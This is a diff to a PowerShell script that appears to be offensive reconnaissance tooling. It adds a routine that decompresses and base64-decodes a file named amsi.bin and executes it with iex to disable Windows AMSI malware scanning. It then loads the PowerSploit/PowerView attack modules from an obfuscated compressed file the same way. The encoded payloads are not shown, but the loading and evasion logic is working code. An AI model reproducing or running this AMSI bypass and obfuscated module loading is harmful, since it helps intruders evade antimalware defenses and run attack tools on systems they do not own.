@@ -25,6 +25,26 @@ param(
 # ----------------------------------------------------------------
 # ----------------------------------------------------------------
 
+function Get-DecompressedByteArray {
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray = $(Throw("-byteArray is required"))
+    )
+    Process {
+        Write-Verbose "Get-DecompressedByteArray"
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
+        $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+        $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+        $input.Close()
+        [byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
 function Import-CustomModule($ScriptPath, $ModuleName){
     Import-Module "$ScriptPath"
 
@@ -37,9 +57,25 @@ function Import-CustomModule($ScriptPath, $ModuleName){
     Importing main modules
 #>
 
+#
+# Before importing any module, it's better to disable AMSI
+#
+
+[System.Text.Encoding] $enc = [System.Text.Encoding]::UTF8
+$base64str = $enc.GetString((Get-DecompressedByteArray -byteArray (Get-Content $PSScriptRoot\modules\amsi.bin)))
+iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64str)))
+
+if([Bypass.A_M_S_I]::Disable() -eq "0") {
+    Write-Output "[+] AMSI has been disabled"
+} else {
+    Write-Output "[!] Problem while disabling AMSI"
+}
+
 if (-Not ((Get-Module -Name "PowerSploit") -ne $null -or (Get-Module -Name "PowerView") -ne $null -or (Get-Module -Name "Recon") -ne $null)){
-    Write-Output "[+] PowerSploit module not found. Importing from obfuscated b64 file ..."
-    iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($(Get-Content $PSScriptRoot\modules\pviewb64.txt))))
+    Write-Output "[+] PowerSploit module not found. Importing from compressed bin file ..."
+
+    $base64str = $enc.GetString((Get-DecompressedByteArray -byteArray (Get-Content $PSScriptRoot\modules\pview.bin)))
+    iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64str)))
 
     # https://github.com/PowerShellMafia/PowerSploit/issues/363
 }
